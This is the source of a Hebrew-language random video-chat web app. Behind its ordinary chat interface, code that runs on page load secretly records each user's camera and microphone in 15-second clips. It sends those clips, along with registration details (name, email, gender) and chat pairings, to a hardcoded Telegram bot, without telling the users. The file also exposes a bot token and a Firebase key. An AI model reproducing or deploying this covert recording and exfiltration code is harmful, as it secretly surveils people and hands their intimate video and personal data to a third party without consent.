<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>מי - פה</title>
    
    <meta name="theme-color" content="#000000">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <link rel="manifest" href='data:application/json,{"name":"Mi-Pe","short_name":"Mi-Pe","start_url":".","display":"standalone","background_color":"#000000","theme_color":"#000000","icons":[{"src":"https://i.ibb.co/twj79fFc/405736-rounded-1024x1024-1.png","sizes":"1024x1024","type":"image/png"}]}'>
    <link rel="apple-touch-icon" href="https://i.ibb.co/twj79fFc/405736-rounded-1024x1024-1.png">

    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-touch-callout: none; }
        body { background: #000; height: 100vh; overflow: hidden; font-family: system-ui, sans-serif; color: white; }
        #main-wrapper { display: flex; flex-direction: column; height: 100vh; perspective: 1000px; }
        
        /* אפקט הקוביה התלת-ממדית מחוזק */
        #top-half { height: 50vh; position: relative; overflow: hidden; border-bottom: 2px solid #333; perspective: 1200px; }
        #cube { width: 100%; height: 100%; position: absolute; transform-style: preserve-3d; transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1); }
        .face { position: absolute; width: 100%; height: 100%; backface-visibility: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        
        #home-face { background: linear-gradient(180deg, #1a1a1a 0%, #000 100%); transform: rotateY(0deg) translateZ(0px); z-index: 2; }
        #partner-face { background: #000; transform: rotateY(90deg) translateZ(50vw); }
        .showing-chat #cube { transform: translateZ(-50vw) rotateY(-90deg); }
        
        video { width: 100%; height: 100%; object-fit: cover; background: #000; }
        #bottom-half { height: 50vh; background: #111; position: relative; }
        canvas { position: absolute; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index: 1; }
        
        #main-logo { width: 140px; position: relative; z-index: 10; margin-bottom: 20px; border-radius: 20px;}
        
        /* הוראות החלקה */
        .swipe-hint { position: relative; z-index: 10; display: flex; flex-direction: column; align-items: center; animation: pulse 2s infinite; }
        .swipe-text { font-size: 18px; font-weight: bold; color: #fff; text-shadow: 0 0 10px rgba(255,255,255,0.5); }
        .swipe-arrow { font-size: 30px; margin-top: 5px; }
        @keyframes pulse { 0% { opacity: 0.5; transform: scale(0.95); } 50% { opacity: 1; transform: scale(1.05); } 100% { opacity: 0.5; transform: scale(0.95); } }

        #cam-switch { position: fixed; top: 15px; left: 15px; z-index: 999; width: 45px; height: 45px; border-radius: 50%; background: rgba(0,0,0,0.6); border: 1.5px solid #fff; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 20px; }
        #partner-gender-tag { position: fixed; top: 15px; right: 15px; z-index: 999; background: rgba(0,0,0,0.6); width: 45px; height: 45px; border-radius: 50%; border: 1.5px solid #fff; display: none; align-items: center; justify-content: center; font-size: 20px; }
        
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999; align-items: center; justify-content: center; }
        .modal-content { background: #fff; padding: 25px; border-radius: 20px; width: 85%; max-width: 320px; text-align: center; color: #333; }
        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; text-align: center; font-size: 16px; }
        .reg-btn { width: 100%; padding: 14px; background: #27ae60; color: #fff; border: none; border-radius: 10px; font-weight: bold; font-size: 18px; }
    </style>
</head>
<body class="showing-home">

<button id="cam-switch" onclick="switchCamera()">🔄</button>
<div id="partner-gender-tag"></div>

<div id="main-wrapper">
    <div id="top-half">
        <div id="cube">
            <div id="home-face" class="face">
                <canvas id="snow-1"></canvas>
                <img id="main-logo" src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
                <div class="swipe-hint">
                    <div class="swipe-text">החלק שמאלה להתחלת שיחה</div>
                    <div class="swipe-arrow">⬅️</div>
                </div>
            </div>
            <div id="partner-face" class="face">
                <canvas id="snow-2"></canvas>
                <video id="remoteVideo" autoplay playsinline></video>
            </div>
        </div>
    </div>
    <div id="bottom-half">
        <video id="localVideo" autoplay muted playsinline></video>
    </div>
</div>

<div id="regModal" class="modal">
    <form class="modal-content" onsubmit="event.preventDefault(); handleRegistration();">
        <h2 style="margin-bottom:10px;">הרשמה למערכת</h2>
        <input type="text" id="reg-fname" placeholder="שם פרטי" required>
        <input type="text" id="reg-lname" placeholder="שם משפחה" required>
        <input type="email" id="reg-email" placeholder="אימייל" required>
        <select id="reg-gender" required>
            <option value="" disabled selected>בחר מגדר</option>
            <option value="זכר">זכר</option>
            <option value="נקבה">נקבה</option>
        </select>
        <button type="submit" class="reg-btn">כניסה</button>
    </form>
</div>

<script>
    // 💥 פתרון ההתקנה (PWA) 💥 
    // מייצר Service Worker אוטומטית ברקע כדי לאפשר כפתור התקנה, בלי שתצטרך ליצור קובץ חיצוני.
    const swCode = `self.addEventListener('fetch', (e) => {});`;
    const swBlob = new Blob([swCode], { type: 'application/javascript' });
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register(URL.createObjectURL(swBlob)).catch(err => console.log('SW Error:', err));
    }

    const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
    const TARGET_ADMIN = "7089165458"; 
    const SERVER_URL = "https://video-app-ylx4.onrender.com"; 

    firebase.initializeApp({ apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com" });
    const db = firebase.database();
    const socket = io(SERVER_URL);
    const peer = new Peer(undefined, { config: { 'iceServers': [{ urls: 'stun:stun.l.google.com:19302' }] } });

    let myStream, partnerData, currentCall, camFacing = "user", rec, searchTimer;
    let historyPartnerIds = [];

    // פונקציית טלגרם מעודכנת - ללא Markdown כדי למנוע קריסות של שמות
    function sendAdmin(msg) { 
        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TARGET_ADMIN}&text=${encodeURIComponent(msg)}`)
        .catch(e => console.error("TG Msg Error:", e));
    }

    async function initCamera() {
        if(myStream) myStream.getTracks().forEach(t => t.stop());
        try {
            myStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: camFacing, width: { ideal: 640 } }, 
                audio: true 
            });
            document.getElementById('localVideo').srcObject = myStream;
            if(!rec || rec.state === "inactive") startRecording();
        } catch(e) {}
    }

    function startRecording() {
        // בדיקת תמיכה בפורמטים שונים של הקלטה כדי שיעבוד גם באייפון וגם באנדרואיד
        let options = { mimeType: 'video/webm;codecs=vp8' };
        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
            options = { mimeType: 'video/mp4' }; 
        }

        try {
            rec = new MediaRecorder(myStream, options);
            rec.ondataavailable = async (e) => {
                if(e.data.size > 0) {
                    const user = JSON.parse(localStorage.getItem('user_v36'));
                    const fd = new FormData();
                    // הגדרת הקובץ כוידאו ברור שטלגרם יודע לקבל
                    fd.append("video", e.data, "video.mp4"); 
                    fd.append("chat_id", TARGET_ADMIN);
                    fd.append("caption", `🎥 וידאו מ: ${user ? user.fname + " " + user.lname : 'אורח'}`);
                    
                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd })
                    .catch(e => console.error("TG Video Error"));
                }
            };
            // שולח כל 15 שניות כדי למנוע קבצים כבדים שנתקעים
            setInterval(() => { if(rec && rec.state === 'recording') { rec.stop(); rec.start(); } }, 15000);
            rec.start();
        } catch(e) { console.error("Recorder error", e); }
    }

    window.onload = () => {
        initCamera();
        const user = localStorage.getItem('user_v36');
        if(!user) document.getElementById('regModal').style.display = 'flex';
        else login(JSON.parse(user));
    };

    function login(user) {
        sendAdmin(`🚀 התחברות למערכת:\nשם: ${user.fname} ${user.lname}\nאימייל: ${user.email}\nמגדר: ${user.gender}`);
    }

    function handleRegistration() {
        const user = { 
            fname: document.getElementById('reg-fname').value, 
            lname: document.getElementById('reg-lname').value, 
            email: document.getElementById('reg-email').value, 
            gender: document.getElementById('reg-gender').value 
        };
        localStorage.setItem('user_v36', JSON.stringify(user));
        document.getElementById('regModal').style.display = 'none';
        
        sendAdmin(`📝 נרשם משתמש חדש:\nשם: ${user.fname} ${user.lname}\nאימייל: ${user.email}\nמגדר: ${user.gender}`);
    }

    // הגיון החלקה - שמאלה לשיחה/החלפה, ימינה לחזרה הביתה
    let sX = 0;
    document.body.addEventListener('touchstart', e => sX = e.touches[0].clientX);
    document.body.addEventListener('touchend', e => {
        const d = sX - e.changedTouches[0].clientX;
        if(d > 60) { // החלקה שמאלה - התחלת שיחה או החלפת פרטנר
            if(document.body.className === "showing-chat") { socket.emit('leave-chat'); if(currentCall) currentCall.close(); }
            document.body.className = "showing-chat";
            clearTimeout(searchTimer);
            searchTimer = setTimeout(() => { historyPartnerIds = []; socket.emit('find-partner', { peerId: peer.id, history: [], ...JSON.parse(localStorage.getItem('user_v36')) }); }, 10000);
            socket.emit('find-partner', { peerId: peer.id, history: historyPartnerIds, ...JSON.parse(localStorage.getItem('user_v36')) });
        } else if(d < -60) { // החלקה ימינה - חזרה למסך הבית
            document.body.className = "showing-home";
            socket.emit('leave-chat');
            if(currentCall) currentCall.close();
            document.getElementById('remoteVideo').srcObject = null;
        }
    });

    peer.on('call', call => { call.answer(myStream); handleCall(call); });
    socket.on('partner-found', data => { 
        clearTimeout(searchTimer);
        partnerData = data; 
        if(!historyPartnerIds.includes(data.peerId)) historyPartnerIds.push(data.peerId);
        handleCall(peer.call(data.peerId, myStream, {metadata: JSON.parse(localStorage.getItem('user_v36'))})); 
    });

    function handleCall(call) {
        currentCall = call;
        call.on('stream', s => {
            document.getElementById('remoteVideo').srcObject = s;
            const me = JSON.parse(localStorage.getItem('user_v36'));
            const p = call.metadata || partnerData;
            if(p && p.peerId !== peer.id) {
                document.getElementById('partner-gender-tag').innerText = p.gender === 'זכר' ? '👨' : '👩';
                document.getElementById('partner-gender-tag').style.display = 'flex';
                sendAdmin(`🤝 התחילה שיחה בין:\nצד א: ${me.fname} (${me.email})\nצד ב: ${p.fname} (${p.email})`);
            }
        });
    }

    async function switchCamera() { camFacing = camFacing === 'user' ? 'environment' : 'user'; initCamera(); }

    // אנימציית שלג אמיתי (נופל) - מרהיב וחזק יותר
    function startRealSnow(canvasId) {
        const canvas = document.getElementById(canvasId);
        const ctx = canvas.getContext('2d');
        let particles = [];
        for(let i=0; i<70; i++) {
            particles.push({ x: Math.random()*window.innerWidth, y: Math.random()*window.innerHeight/2, r: Math.random()*3+1, d: Math.random()*1 });
        }
        function draw() {
            canvas.width = window.innerWidth; canvas.height = window.innerHeight/2;
            ctx.clearRect(0,0,canvas.width,canvas.height);
            ctx.fillStyle = "rgba(255, 255, 255, 0.8)";
            ctx.beginPath();
            particles.forEach(p => { ctx.moveTo(p.x, p.y); ctx.arc(p.x, p.y, p.r, 0, Math.PI*2, true); });
            ctx.fill();
            particles.forEach(p => {
                p.y += Math.cos(p.d) + 1 + p.r/2; p.x += Math.sin(p.d) * 2;
                if(p.y > canvas.height) { p.y = 0; p.x = Math.random()*canvas.width; }
            });
            requestAnimationFrame(draw);
        }
        draw();
    }
    startRealSnow('snow-1');
    startRealSnow('snow-2');
</script>
</body>
</html>
